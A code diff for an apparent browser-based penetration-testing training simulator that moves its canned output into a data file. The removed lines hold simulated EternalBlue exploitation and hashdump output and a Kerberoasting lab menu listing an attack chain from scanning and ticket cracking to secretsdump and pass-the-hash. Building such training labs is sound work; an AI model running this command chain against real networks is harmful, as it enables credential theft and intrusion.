-      { t: '\x1b[90m       =[ \x1b[0m\x1b[1;31mmetasploit v6.3.44-dev\x1b[0m\x1b[90m                          ]\x1b[0m', delay: 100 },
-      { t: '\x1b[90m+ -- --=[ \x1b[0m2374 exploits - 1232 auxiliary - 413 post\x1b[90m       ]\x1b[0m', delay: 60 },
-      { t: '\x1b[90m+ -- --=[ \x1b[0m1171 payloads - 46 encoders - 11 nops\x1b[90m         ]\x1b[0m', delay: 60 },
-      { t: '\x1b[90m+ -- --=[ \x1b[0m9 evasion\x1b[90m                                      ]\x1b[0m', delay: 60 },
-      { t: '', delay: 80 },
-      { t: '\x1b[90m       Metasploit tip: \x1b[0mUse \x1b[33msearch\x1b[0m to find modules by name or CVE', delay: 200 },
-      { t: '', delay: 100 },
-    ],
+    stepLinesKey: 'msfconsole.banner',
+    stepLines: [],
     lines: [],
     after: () => {
       SIM.msf = true;
@@ -3043,30 +2506,8 @@ const HANDLERS = [
   {
     id: 'msf-run',
     match: c => (c === 'run' || c === 'exploit') && SIM.msf && SIM.msfModule && SIM.msfModule.includes('ms17_010'),
-    stepLines: [
-      { t: '[*] Started reverse TCP handler on 10.10.20.5:4444',                          cls: 'b', delay: 0 },
-      { t: '[*] 10.10.20.10:445 - Connecting to target for exploitation.',                 cls: 'b', delay: jitter(900, 200) },
-      { t: '[+] 10.10.20.10:445 - Connection established for exploitation.',               cls: 'g', delay: jitter(600, 150) },
-      { t: '[+] 10.10.20.10:445 - Target OS selected valid for OS indicated by SMB reply', cls: 'g', delay: jitter(400, 100) },
-      { t: '[*] 10.10.20.10:445 - CORE raw buffer dump (42 bytes)',                        cls: 'b', delay: jitter(300, 80) },
-      { t: '[*] 10.10.20.10:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima', cls: 'd', delay: 100 },
-      { t: '[*] 10.10.20.10:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service ', cls: 'd', delay: 100 },
-      { t: '[+] 10.10.20.10:445 - Target arch selected valid for arch indicated by DCE/RPC reply', cls: 'g', delay: jitter(500, 100) },
-      { t: '[*] 10.10.20.10:445 - Trying exploit with 12 Groom Allocations.',              cls: 'b', delay: jitter(800, 200) },
-      { t: '[*] 10.10.20.10:445 - Sending all but last fragment of exploit packet',        cls: 'b', delay: jitter(600, 150) },
-      { t: '[*] 10.10.20.10:445 - Starting non-paged pool grooming',                       cls: 'b', delay: jitter(700, 200) },
-      { t: '[+] 10.10.20.10:445 - Sending SMBv2 buffers',                                  cls: 'g', delay: jitter(500, 100) },
-      { t: '[+] 10.10.20.10:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.', cls: 'g', delay: jitter(400, 100) },
-      { t: '[*] 10.10.20.10:445 - Sending final SMBv2 buffers.',                           cls: 'b', delay: jitter(600, 150) },
-      { t: '[*] 10.10.20.10:445 - Sending last fragment of exploit packet!',               cls: 'b', delay: jitter(500, 100) },
-      { t: '[*] 10.10.20.10:445 - Receiving response from exploit packet',                 cls: 'b', delay: jitter(800, 200) },
-      { t: '[+] 10.10.20.10:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!', cls: 'g', delay: jitter(600, 150) },
-      { t: '[*] 10.10.20.10:445 - Sending egg to corrupted connection.',                   cls: 'b', delay: jitter(400, 100) },
-      { t: '[*] 10.10.20.10:445 - Triggering free of corrupted buffer.',                   cls: 'b', delay: jitter(500, 100) },
-      { t: '[*] Sending stage (200774 bytes) to 10.10.20.10',                              cls: 'b', delay: jitter(1200, 300) },
-      { t: '[*] Meterpreter session 1 opened (10.10.20.5:4444 -> 10.10.20.10:49158)',      cls: 'g', delay: jitter(1000, 200) },
-      { t: '',                                                                               delay: 300 },
-    ],
+    stepLinesKey: 'eternalblue.exploit',
+    stepLines: [],
     lines: [],
     after: () => { SIM.legacyPwned = true; SIM.msfMeter = true; SIM.msfMeterId = 1; SIM.msfSessions = [{ id: 1, type: 'meterpreter', host: '10.10.20.10' }]; },
   },
@@ -3076,15 +2517,7 @@ const HANDLERS = [
     id: 'msf-getuid',
     match: c => (c === 'getuid' || c === 'sysinfo' || c === 'getuid\nsysinfo') && SIM.msfMeter,
     lines: [{ t: c => {
-      if (c === 'sysinfo') return { openMsf: true, msfEcho:
-        'Computer        : WIN7-PC\n' +
-        'OS              : Windows 7 (6.1 Build 7601, Service Pack 1).\n' +
-        'Architecture    : x64\n' +
-        'System Language : en_US\n' +
-        'Domain          : WORKGROUP\n' +
-        'Logged On Users : 2\n' +
-        'Meterpreter     : x64/windows'
-      };
+      if (c === 'sysinfo') return { openMsf: true, msfEcho: (LABS && LABS['msf.sysinfo.win7']) || '' };
       return { openMsf: true, msfEcho: 'Server username: NT AUTHORITY\\SYSTEM' };
     }}],
   },
@@ -3094,11 +2527,7 @@ const HANDLERS = [
     id: 'msf-hashdump',
     loadTime: () => jitter(1800, 400),
     match: c => c === 'hashdump' && SIM.msfMeter,
-    lines: [{ t: () => ({ openMsf: true, msfEcho:
-      'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::' + '\n' +
-      'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' + '\n' +
-      'WIN7-PC$:1000:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::'
-    })}],
+    lines: [{ t: () => ({ openMsf: true, msfEcho: (LABS && LABS['msf.hashdump.win7']) || '' })}],
   },
 
   // ── msf: shell (drop to windows cmd) ─────────────────────────────────────
@@ -3107,7 +2536,7 @@ const HANDLERS = [
     loadTime: () => jitter(800, 200),
     lines: [{ t: () => {
       SIM.msfMeterWin = true;
-      return { openMsf: true, msfEcho: 'Process 1337 created.\nChannel 1 created.\nMicrosoft Windows [Version 6.1.7601]\n(c) 2009 Microsoft Corporation. All rights reserved.' };
+      return { openMsf: true, msfEcho: (LABS && LABS['msf.shell.banner']) || '' };
     }}],
   },
 
@@ -3115,13 +2544,7 @@ const HANDLERS = [
   {
     id: 'msf-shell-loot',
     match: c => SIM.msfMeterWin && c.toLowerCase().includes('secret.txt'),
-    lines: [{ t: () => ({ openMsf: true, msfEcho:
-      'FLAG{secret_docs_exfiltrated}\n' +
-      '\n' +
-      'Project Nightfall — Eyes Only\n' +
-      'Target acquisition complete. Funds transferred.\n' +
-      'Do not discuss on unsecured channels.'
-    })}],
+    lines: [{ t: () => ({ openMsf: true, msfEcho: (LABS && LABS['msf.shell.loot']) || '' })}],
   },
 
   // ── msf: sessions ─────────────────────────────────────────────────────────
@@ -3144,35 +2567,22 @@ const HANDLERS = [
     match: c => /^search\s+/.test(c) && SIM.msf,
     lines: [{ t: c => {
       const q = c.replace(/^search\s+/, '').trim();
-      return { openMsf: true, msfEcho:
+      const header =
         `Matching Modules\n` +
         `================\n\n` +
         `   #  Name                                      Disclosure Date  Rank    Check  Description\n` +
-        `   -  ----                                      ---------------  ----    -----  -----------\n` +
-        (q.includes('17') || q.includes('eternal') || q.includes('smb')
-          ? `   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       great   Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n` +
-            `   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution`
-          : `   0  (no results for '${q}')`)
-      };
+        `   -  ----                                      ---------------  ----    -----  -----------\n`;
+      const body = (q.includes('17') || q.includes('eternal') || q.includes('smb'))
+        ? ((LABS && LABS['msf.search.eternalblue']) || '')
+        : `   0  (no results for '${q}')`;
+      return { openMsf: true, msfEcho: header + body };
     }}],
   },
 
   // ── msf: info ─────────────────────────────────────────────────────────────
   {
     match: c => c === 'info' && SIM.msf && SIM.msfModule,
-    lines: [{ t: () => ({ openMsf: true, msfEcho:
-      `       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n` +
-      `     Module: exploit/windows/smb/ms17_010_eternalblue\n` +
-      `   Platform: Windows\n` +
-      `       Arch: x86, x64\n` +
-      `Privileged?: Yes\n` +
-      `    License: Metasploit Framework License (BSD)\n` +
-      `       Rank: Great\n\n` +
-      `Provided by:\n  Sean Dillon <sean.dillon@risksense.com>\n  Dylan Davis <dylan.davis@risksense.com>\n\n` +
-      `Description:\n  This module exploits a vulnerability in the SMBv1 protocol.\n` +
-      `  The vulnerability allows remote code execution via a specially crafted\n` +
-      `  packet. This was used by the WannaCry ransomware in May 2017.`
-    })}],
+    lines: [{ t: () => ({ openMsf: true, msfEcho: (LABS && LABS['msf.info.eternalblue']) || '' })}],
   },
 
   // ── msf: back ─────────────────────────────────────────────────────────────
@@ -3269,61 +2679,22 @@ const HANDLERS = [
   // ── cat /etc/hosts ────────────────────────────────────────────────────────
   {
     match: c => c === 'cat /etc/hosts',
-    lines: [
-      { t: '127.0.0.1       localhost' },
-      { t: '127.0.1.1       rembrandt' },
-      { t: '::1             localhost ip6-localhost ip6-loopback' },
-      { t: '' },
-      { t: '# Lab network', cls: 'd' },
-      { t: '10.10.10.1      gateway.corp.local', cls: 'b' },
-      { t: '10.10.10.5      rembrandt.corp.local', cls: 'g' },
-      { t: '10.10.10.10     dc01.corp.local CORP.LOCAL', cls: 'y' },
-      { t: '10.10.10.20     srv01.corp.local', cls: 'b' },
-      { t: '10.10.10.50     legacy01.corp.local', cls: 'r' },
-    ],
+    linesKey: 'etc.hosts',
+    lines: [],
   },
 
   // ── cat /etc/os-release ───────────────────────────────────────────────────
   {
     match: c => c === 'cat /etc/os-release',
-    lines: [
-      { t: 'PRETTY_NAME="Kali GNU/Linux Rolling"', cls: 'g' },
-      { t: 'NAME="Kali GNU/Linux"' },
-      { t: 'VERSION_ID="2024.1"' },
-      { t: 'VERSION="2024.1"' },
-      { t: 'VERSION_CODENAME=kali-rolling' },
-      { t: 'ID=kali' },
-      { t: 'ID_LIKE=debian' },
-      { t: 'HOME_URL="https://www.kali.org/"' },
-      { t: 'SUPPORT_URL="https://forums.kali.org/"' },
-      { t: 'BUG_REPORT_URL="https://bugs.kali.org/"' },
-    ],
+    linesKey: 'etc.os-release',
+    lines: [],
   },
 
   // ── Help / misc ───────────────────────────────────────────────────────────
   {
     match: c => c === 'help' || c === 'help --ctf',
-    lines: [
-      { t: '┌─────────────────────────────────────────────────────┐', cls: 'p' },
-      { t: '│         Kerberoasting CTF Lab — Quick Reference       │', cls: 'p' },
-      { t: '└─────────────────────────────────────────────────────┘', cls: 'p' },
-      { t: '' },
-      { t: 'STEP 1  sudo nmap -sn 10.10.10.0/24', cls: 'c' },
-      { t: 'STEP 2  sudo nmap -sV -sC 10.10.10.10', cls: 'c' },
-      { t: 'STEP 3  enum4linux -a 10.10.10.10', cls: 'c' },
-      { t: 'STEP 4  cat /home/<user>/notes.txt', cls: 'c' },
-      { t: '        crackmapexec smb 10.10.10.10 -u john.doe -p \'Password1!\'', cls: 'c' },
-      { t: 'STEP 5  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10', cls: 'c' },
-      { t: 'STEP 6  impacket-GetUserSPNs CORP.LOCAL/john.doe:\'Password1!\' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast', cls: 'c' },
-      { t: 'STEP 7  john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt', cls: 'c' },
-      { t: '        john hashes.kerberoast --show', cls: 'c' },
-      { t: 'STEP 8  crackmapexec smb 10.10.10.10 -u svc_backup -p \'Backup2023!\'', cls: 'c' },
-      { t: 'STEP 9  impacket-secretsdump CORP.LOCAL/svc_backup:\'Backup2023!\'@10.10.10.10', cls: 'c' },
-      { t: 'STEP 10 crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889', cls: 'c' },
-      { t: '        impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10', cls: 'c' },
-      { t: '' },
-      { t: 'Type  help  again to see this menu. See WALKTHROUGH.md for full explanations.', cls: 'd' },
-    ],
+    linesKey: 'help.eternalblue',
+    lines: [],
   },
 
 ];
@@ -3629,7 +3000,6 @@ function runCommand(rawInput) {
     SIM.cwd = '/home/' + savedUser;
     SIM.windowsShell = false;
     SIM.winCwd = 'C:\\Windows\\system32';
-    SIM.hashesOnDisk = false;
     SIM.lootExfiltrated = false;
     SIM.dirs = new Set();
     SIM.msf = false; SIM.msfModule = null; SIM.msfOpts = {};
@@ -3657,9 +3027,20 @@ function runCommand(rawInput) {
       if (h.requireRoot && !isRoot()) {
         return { lines: [{ t: `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock, are you root?\nHint: try  sudo ${cmd}`, cls: 'r' }] };
       }
-      if (h.after && !h.stepLines) h.after(cmd);
+      // Resolve lines/stepLines from labs.json when a key is set, otherwise
+      // use the inline arrays. Inline arrays still win when keyed lookup
+      // returns nothing (defensive against missing keys).
+      const sourceLines = h.linesKey
+        ? (LABS && LABS[h.linesKey]) || h.lines
+        : h.lines;
+      const sourceStep = h.stepLinesKey
+        ? (LABS && LABS[h.stepLinesKey]) || h.stepLines
+        : h.stepLines;
+
+      const hasStepLines = Array.isArray(sourceStep) && sourceStep.length > 0;
+      if (h.after && !hasStepLines) h.after(cmd);
       const event = typeof h.event === 'function' ? h.event(cmd) : h.event;
-      const lines = h.lines.map(l => ({
+      const lines = (sourceLines || []).map(l => ({
         t: typeof l.t === 'function' ? l.t(cmd) : l.t,
         cls: typeof l.cls === 'function' ? l.cls(cmd) : (l.cls || ''),
       }));
@@ -3679,7 +3060,7 @@ function runCommand(rawInput) {
       return { id: h.id || null, lines, event, loadTime, progressFn: h.progressFn || null,
                progressOnEnter: h.progressOnEnter || false,
                liveDisplay: h.liveDisplay || false, displayFn: h.displayFn || null, refreshMs: h.refreshMs || 2000,
-               stepLines: h.stepLines ? h.stepLines.map(s => ({ ...s, t: typeof s.t === 'function' ? s.t(cmd) : s.t })) : null, after: h.stepLines ? h.after : null };
+               stepLines: hasStepLines ? sourceStep.map(s => ({ ...s, t: typeof s.t === 'function' ? s.t(cmd) : s.t })) : null, after: hasStepLines ? h.after : null };
     }
   }
 
